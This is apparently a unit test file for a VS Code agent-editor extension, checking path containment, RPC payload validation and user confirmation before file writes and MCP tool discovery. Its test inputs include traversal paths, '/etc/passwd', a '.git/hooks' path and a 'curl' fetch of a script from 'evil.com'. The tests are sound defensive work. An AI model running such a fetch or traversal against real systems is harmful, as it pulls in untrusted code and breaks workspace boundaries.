/**
 * Unit Tests for RPC Payload and Workspace Boundary Validation
 *
 * Author: Mike Nimer <mikenimer@google.com>
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import * as vscode from 'vscode';
import * as path from 'path';
import { assertInsideWorkspace, isPathInside } from '../../src/extension/security/pathGuard';
import {
  isValidRpcMessage,
  isWriteFilesPayload,
  isStartRunnerPayload,
  isDiscoverMcpPayload,
} from '../../src/shared/rpcProtocol';
import { AgentEditorProvider } from '../../src/extension/AgentEditorProvider';
import { createSpy } from '../mocks/vscode';

describe('RPC Payload and Workspace Containment Security', { concurrency: 1 }, () => {
  beforeEach(() => {
    vscode.resetAllMocks();
  });

  describe('Path Containment Guard', () => {
    const baseUri = vscode.Uri.file('/mock/workspace');

    it('should allow valid relative paths within workspace', () => {
      const result = assertInsideWorkspace(baseUri, 'src/main.py');
      assert.equal(result.fsPath, path.resolve('/mock/workspace/src/main.py'));
    });

    it('should reject path traversal attempts', () => {
      assert.throws(() => {
        assertInsideWorkspace(baseUri, '../evil.txt');
      }, /directory traversal/);

      assert.throws(() => {
        assertInsideWorkspace(baseUri, 'src/../../evil.txt');
      }, /directory traversal/);
    });

    it('should reject absolute paths', () => {
      assert.throws(() => {
        assertInsideWorkspace(baseUri, '/etc/passwd');
      }, /must be relative/);

      assert.throws(() => {
        assertInsideWorkspace(baseUri, 'C:\\Windows\\system32');
      }, /drive letter/);
    });

    it('should reject UNC paths', () => {
      assert.throws(() => {
        assertInsideWorkspace(baseUri, '\\\\unc\\share');
      }, /UNC prefix/);

      assert.throws(() => {
        assertInsideWorkspace(baseUri, '//unc/share');
      }, /UNC prefix/);
    });

    it('should reject .git folder access to secure git hooks', () => {
      assert.throws(() => {
        assertInsideWorkspace(baseUri, '.git/hooks/pre-commit');
      }, /\.git folder/);
    });
  });

  describe('Runtime Type Guards', () => {
    it('should validate envelope and reject non-objects or missing types', () => {
      assert.equal(isValidRpcMessage(null), false);
      assert.equal(isValidRpcMessage({}), false);
      assert.equal(isValidRpcMessage({ type: 'TEST' }), true);
    });

    it('should validate WRITE_FILES_TO_WORKSPACE payloads', () => {
      assert.equal(isWriteFilesPayload(null), false);
      assert.equal(isWriteFilesPayload({ files: 'not-array' }), false);
      assert.equal(isWriteFilesPayload({ files: [{ path: 'foo.ts' }] }), false); // missing content
      assert.equal(isWriteFilesPayload({ files: [{ path: 'foo.ts', content: 'bar' }] }), true);
      assert.equal(isWriteFilesPayload({ files: [{ path: 'foo.ts', content: 'bar' }], targetDirectory: 123 }), false);
    });

    it('should validate START_LOCAL_RUNNER payloads', () => {
      assert.equal(isStartRunnerPayload(null), false);
      assert.equal(isStartRunnerPayload({ targetDirectory: 123 }), false);
      assert.equal(isStartRunnerPayload({ port: '8080' }), false);
      assert.equal(isStartRunnerPayload({ port: 8080, envVars: 'not-an-object' }), false);
      assert.equal(isStartRunnerPayload({ port: 8080, envVars: { VAR: 123 } }), false); // var value is number
      assert.equal(isStartRunnerPayload({ port: 8080, envVars: { VAR: 'val' } }), true);
    });

    it('should validate DISCOVER_MCP_TOOLS payloads', () => {
      assert.equal(isDiscoverMcpPayload(null), false);
      assert.equal(isDiscoverMcpPayload({ transport: 'invalid' }), false);
      assert.equal(isDiscoverMcpPayload({ transport: 'stdio', command: 123 }), false);
      assert.equal(isDiscoverMcpPayload({ transport: 'stdio', command: 'node', args: 'not-an-array' }), false);
      assert.equal(isDiscoverMcpPayload({ transport: 'stdio', command: 'node', args: [123] }), false);
      assert.equal(isDiscoverMcpPayload({ transport: 'stdio', command: 'node', args: ['-v'] }), true);
    });
  });

  describe('AgentEditorProvider Integration & Confirmations', () => {
    const mockContext: any = {
      extensionPath: '/mock/extension',
      extensionUri: vscode.Uri.file('/mock/extension'),
      subscriptions: [],
    };

    it('should prompt warning message and abort WRITE_FILES_TO_WORKSPACE if overwrite confirmation declined', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/sample.agent'),
        getText: () => '{}',
      };

      // Set workspaceFolders mock
      vscode.workspace.workspaceFolders = [
        { uri: vscode.Uri.file('/mock/workspace') } as any
      ];

      // Mock fs.stat to indicate files exist (so overwrite prompt is triggered)
      const originalStat = vscode.workspace.fs.stat;
      vscode.workspace.fs.stat = createSpy(async () => ({ size: 100 } as any));

      // Mock showWarningMessage to return 'Cancel' (decline overwrite)
      const originalShowWarningMessage = vscode.window.showWarningMessage;
      vscode.window.showWarningMessage = createSpy(async () => 'Cancel');

      // Setup WebviewBridge mock
      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      // Trigger write message
      assert.ok(messageCallback);
      await messageCallback({
        type: 'WRITE_FILES_TO_WORKSPACE',
        payload: {
          files: [{ path: 'main.py', content: 'print("hello")' }],
        },
      });

      // Verify that the overwrite prompt was shown
      assert.ok(vscode.window.showWarningMessage.calls.length > 0);
      
      // Verify that the write was aborted
      const fileWrittenMsg = postedMessages.find((m) => m.type === 'FILES_WRITTEN');
      assert.ok(fileWrittenMsg);
      assert.equal(fileWrittenMsg.payload.success, false);
      assert.match(fileWrittenMsg.payload.error, /canceled by user/);

      // Restore original mocks
      vscode.workspace.fs.stat = originalStat;
      vscode.window.showWarningMessage = originalShowWarningMessage;
    });

    it('should successfully write files when overwrite is confirmed', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/sample.agent'),
        getText: () => '{}',
      };

      // Set workspaceFolders mock
      vscode.workspace.workspaceFolders = [
        { uri: vscode.Uri.file('/mock/workspace') } as any
      ];

      // Mock fs.stat to indicate files exist
      const originalStat = vscode.workspace.fs.stat;
      vscode.workspace.fs.stat = createSpy(async () => ({ size: 100 } as any));

      // Mock showWarningMessage to return 'Overwrite'
      const originalShowWarningMessage = vscode.window.showWarningMessage;
      vscode.window.showWarningMessage = createSpy(async () => 'Overwrite');

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      // Reset writeFile calls
      vscode.workspace.fs.writeFile.calls = [];

      // Trigger write message
      assert.ok(messageCallback);
      await messageCallback({
        type: 'WRITE_FILES_TO_WORKSPACE',
        payload: {
          files: [{ path: 'main.py', content: 'print("hello")' }],
        },
      });

      // Verify that the overwrite prompt was shown
      assert.equal(vscode.window.showWarningMessage.calls.length, 1);
      
      // Verify that the files were written
      assert.equal(vscode.workspace.fs.writeFile.calls.length, 1);
      const fileWrittenMsg = postedMessages.find((m) => m.type === 'FILES_WRITTEN');
      assert.ok(fileWrittenMsg);
      assert.equal(fileWrittenMsg.payload.success, true);

      // Restore original mocks
      vscode.workspace.fs.stat = originalStat;
      vscode.window.showWarningMessage = originalShowWarningMessage;
    });

    it('should permit allowlisted commands in DISCOVER_MCP_TOOLS directly', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/sample.agent'),
        getText: () => '{}',
      };

      // Mock discoverTools on mcpManager
      const originalMcpManager = (provider as any).mcpManager;
      (provider as any).mcpManager = {
        discoverTools: createSpy(async () => ({
          success: true,
          tools: [],
        })),
      };

      const originalShowWarningMessage = vscode.window.showWarningMessage;
      vscode.window.showWarningMessage = createSpy(async () => 'Deny');

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      // Trigger discovery message with allowlisted command
      assert.ok(messageCallback);
      await messageCallback({
        type: 'DISCOVER_MCP_TOOLS',
        payload: {
          transport: 'stdio',
          command: 'npx',
          args: ['-y', '@modelcontextprotocol/server-postgres'],
        },
      });

      // Verify that no warning message was prompt for allowlisted command
      assert.equal(vscode.window.showWarningMessage.calls.length, 0);
      assert.equal((provider as any).mcpManager.discoverTools.calls.length, 1);

      // Restore original mocks
      (provider as any).mcpManager = originalMcpManager;
      vscode.window.showWarningMessage = originalShowWarningMessage;
    });

    it('should block unallowlisted command in DISCOVER_MCP_TOOLS if user denies', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/sample.agent'),
        getText: () => '{}',
      };

      const originalShowWarningMessage = vscode.window.showWarningMessage;
      vscode.window.showWarningMessage = createSpy(async () => 'Deny');

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      // Trigger discovery message with malicious/unallowlisted command
      assert.ok(messageCallback);
      await messageCallback({
        type: 'DISCOVER_MCP_TOOLS',
        payload: {
          transport: 'stdio',
          command: 'curl',
          args: ['http://evil.com/malicious-script.sh'],
        },
      });

      // Verify warning prompted and discovery blocked
      assert.equal(vscode.window.showWarningMessage.calls.length, 1);
      const toolDiscoveredMsg = postedMessages.find((m) => m.type === 'MCP_TOOLS_DISCOVERED');
      assert.ok(toolDiscoveredMsg);
      assert.equal(toolDiscoveredMsg.payload.success, false);
      assert.match(toolDiscoveredMsg.payload.error, /denied/);

      vscode.window.showWarningMessage = originalShowWarningMessage;
    });

    it('should resolve relative targetDirectory relative to .agent document in START_LOCAL_RUNNER', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/agents/subfolder/animal_agent.agent'),
        getText: () => '{}',
      };

      vscode.workspace.workspaceFolders = [
        { uri: vscode.Uri.file('/mock/workspace') } as any,
      ];

      // Spy on startLocalRunner
      const startLocalRunnerSpy = createSpy(async () => 'runner-123');
      (provider as any).runnerManager = {
        startLocalRunner: startLocalRunnerSpy,
      };

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      assert.ok(messageCallback);
      await messageCallback({
        type: 'START_LOCAL_RUNNER',
        payload: {
          targetDirectory: './animal_agent',
          port: 8000,
        },
      });

      // Verify startLocalRunner was invoked with the document-relative directory
      assert.equal(startLocalRunnerSpy.calls.length, 1);
      const passedOpts = startLocalRunnerSpy.calls[0][0];
      const expectedDir = path.resolve('/mock/workspace/agents/subfolder/animal_agent');
      assert.equal(passedOpts.targetDirectory, expectedDir);
    });

    it('should reject directory traversal in START_LOCAL_RUNNER and post error status', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/agents/sample.agent'),
        getText: () => '{}',
      };

      vscode.workspace.workspaceFolders = [
        { uri: vscode.Uri.file('/mock/workspace') } as any,
      ];

      const startLocalRunnerSpy = createSpy(async () => 'runner-123');
      (provider as any).runnerManager = {
        startLocalRunner: startLocalRunnerSpy,
      };

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      assert.ok(messageCallback);
      await messageCallback({
        type: 'START_LOCAL_RUNNER',
        payload: {
          targetDirectory: '../../outside',
          port: 8000,
        },
      });

      // Local runner must not be called
      assert.equal(startLocalRunnerSpy.calls.length, 0);

      // Status error message must be posted to bridge
      const statusMsg = postedMessages.find((m) => m.type === 'LOCAL_RUNNER_STATUS');
      assert.ok(statusMsg);
      assert.equal(statusMsg.payload.status, 'error');
      assert.match(statusMsg.payload.error, /traversal/);
    });

    it('should write files to document-relative targetDirectory in WRITE_FILES_TO_WORKSPACE', async () => {
      const provider = new AgentEditorProvider(mockContext);
      const mockDoc: any = {
        uri: vscode.Uri.file('/mock/workspace/agents/subfolder/sample.agent'),
        getText: () => '{}',
      };

      vscode.workspace.workspaceFolders = [
        { uri: vscode.Uri.file('/mock/workspace') } as any,
      ];

      let messageCallback: any = null;
      const postedMessages: any[] = [];
      const mockPanel: any = {
        webview: {
          options: {},
          postMessage: async (msg: any) => {
            postedMessages.push(msg);
            return true;
          },
          onDidReceiveMessage: (cb: any) => {
            messageCallback = cb;
            return { dispose: () => {} };
          },
          cspSource: 'vscode-webview:',
          asWebviewUri: (uri: any) => uri.toString(),
        },
        onDidDispose: () => {},
      };

      await provider.resolveCustomTextEditor(mockDoc, mockPanel, {} as any);

      vscode.workspace.fs.writeFile.calls = [];

      assert.ok(messageCallback);
      await messageCallback({
        type: 'WRITE_FILES_TO_WORKSPACE',
        payload: {
          targetDirectory: './animal_agent',
          files: [{ path: 'requirements.txt', content: 'google-adk' }],
        },
      });

      assert.equal(vscode.workspace.fs.writeFile.calls.length, 1);
      const writtenUri = vscode.workspace.fs.writeFile.calls[0][0];
      const expectedFileUri = path.resolve('/mock/workspace/agents/subfolder/animal_agent/requirements.txt');
      assert.equal(writtenUri.fsPath, expectedFileUri);
    });
  });
});
